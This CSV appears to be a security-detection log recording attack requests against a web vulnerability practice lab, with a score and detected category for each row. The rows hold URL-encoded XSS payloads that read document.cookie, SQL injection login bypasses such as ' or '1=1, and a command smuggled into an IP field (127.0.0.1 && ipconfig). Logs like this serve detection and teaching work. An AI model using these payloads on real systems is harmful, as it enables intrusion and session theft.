"192.168.31.99",2016-05-20T09:10:33+08:00,12,"xss csrf id rfe lfi","GET.name=1%3Cscirpt%3Ealert%28123%29%3C%2Fscript%3E","%2Fwork%2Fvulnerabilities%2Fxss_r%2F%3Fname%3D1%253Cscirpt%253Ealert%2528123%2529%253C%252Fscript%253E","192.168.31.24"
"192.168.60.203",2016-06-02T15:04:11+08:00,16,"xss csrf sqli id lfi","GET.password=0%27%20or%20%271%3D1","%2Fwork%2Fvulnerabilities%2Fbrute%2F%3Fusername%3Dchenshi%26password%3D0%2527%2Bor%2B%25271%253D1%26Login%3DLogin","192.168.31.24"
"192.168.60.203",2016-06-02T15:05:11+08:00,16,"xss csrf sqli id lfi","GET.password=0%27%20or%20%271%3D1","%2Fwork%2Fvulnerabilities%2Fbrute%2F%3Fusername%3Dchenshi%26password%3D0%2527%2Bor%2B%25271%253D1%26Login%3DLogin","192.168.31.24"
"192.168.60.203",2016-06-02T15:18:19+08:00,13,"sqli id lfi","GET.username=admin%27%20or%20%271","%2Fwork%2Fvulnerabilities%2Fbrute%2F%3Fusername%3Dadmin%2527%2Bor%2B%25271%26password%3D15501162570%26Login%3DLogin","192.168.31.24"
"192.168.60.203",2016-06-24T17:21:25+08:00,27,"xss csrf id rfe dos","GET.pict=hunte%22%20onerrer%3Dalert%28document.cookie%29%20%3E%29","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunte%2522%2520onerrer%3Dalert%28document.cookie%29%2520%253E%29","192.168.31.24"
"192.168.60.203",2016-06-24T17:21:51+08:00,27,"xss csrf id rfe dos","GET.pict=hunter%22%20onerrer%3Dalert%28document.cookie%29%20%3E","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunter%2522%2520onerrer%3Dalert%28document.cookie%29%2520%253E","192.168.31.24"
"192.168.60.203",2016-06-24T17:22:08+08:00,27,"xss csrf id rfe dos","GET.pict=hunter%22%20onerror%3Dalert%28document.cookie%29%20%3E","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunter%2522%2520onerror%3Dalert%28document.cookie%29%2520%253E","192.168.31.24"
"192.168.60.203",2016-06-24T17:24:18+08:00,27,"xss csrf id rfe dos","GET.pict=hunter%22%20onerror%3Dalert%28document.cookie%29%20%3E","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunter%2522%2520onerror%3Dalert%28document.cookie%29%2520%253E","192.168.31.24"
"192.168.60.203",2016-06-24T17:24:20+08:00,27,"xss csrf id rfe dos","GET.pict=hunter%22%20onerrer%3Dalert%28document.cookie%29%20%3E","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunter%2522%2520onerrer%3Dalert%28document.cookie%29%2520%253E","192.168.31.24"
"192.168.60.203",2016-06-24T17:24:21+08:00,27,"xss csrf id rfe dos","GET.pict=hunte%22%20onerrer%3Dalert%28document.cookie%29%20%3E%29","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunte%2522%2520onerrer%3Dalert%28document.cookie%29%2520%253E%29","192.168.31.24"
"192.168.60.203",2016-06-24T17:25:01+08:00,5,"xss csrf","POST.ip=127.0.0.1%20%26%26%20ipconfig","%2Fwork%2Fvulnerabilities%2Fexec%2F","192.168.31.24"
"192.168.60.203",2016-06-24T17:25:11+08:00,27,"xss csrf id rfe dos","GET.pict=hunter%22%20onerror%3Dalert%28document.cookie%29%20%3E","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fpid%3D4%26pict%3Dhunter%2522%2520onerror%3Dalert%28document.cookie%29%2520%253E","192.168.31.24"
"192.168.60.203",2016-06-24T17:25:56+08:00,5,"xss csrf","POST.ip=127.0.0.1%20%26%26%20ipconfig","%2Fwork%2Fvulnerabilities%2Fexec%2F","192.168.31.24"
"192.168.60.203",2016-06-24T17:26:31+08:00,6,"sqli id lfi","GET.id=1%27","%2Fwork%2Fvulnerabilities%2Fctf%2F%3Fid%3D1%2527%26pid%3D5%26Submit%3DSubmit","192.168.31.24"
"192.168.60.203",2017-01-13T15:34:53+08:00,6,"sqli id lfi","GET.id=1%27","%2Fwork%2Fvulnerabilities%2Fsqli%2F%3Fid%3D1%2527%26Submit%3DSubmit","192.168.31.24"
"192.168.60.203",2017-01-13T15:44:08+08:00,6,"sqli id lfi","GET.id=1%27","%2Fwork%2Fvulnerabilities%2Fsqli%2F%3Fid%3D1%2527%26Submit%3DSubmit","192.168.31.24"
"192.168.60.203",2017-01-13T15:44:17+08:00,6,"sqli id lfi","GET.id=1%27","%2Fwork%2Fvulnerabilities%2Fsqli%2F%3Fid%3D1%2527%26Submit%3DSubmit","192.168.31.24"
"192.168.60.203",2017-01-13T15:45:00+08:00,6,"sqli id lfi","GET.id=1%27","%2Fwork%2Fvulnerabilities%2Fsqli%2F%3Fid%3D1%2527%26Submit%3DSubmit","192.168.31.24"
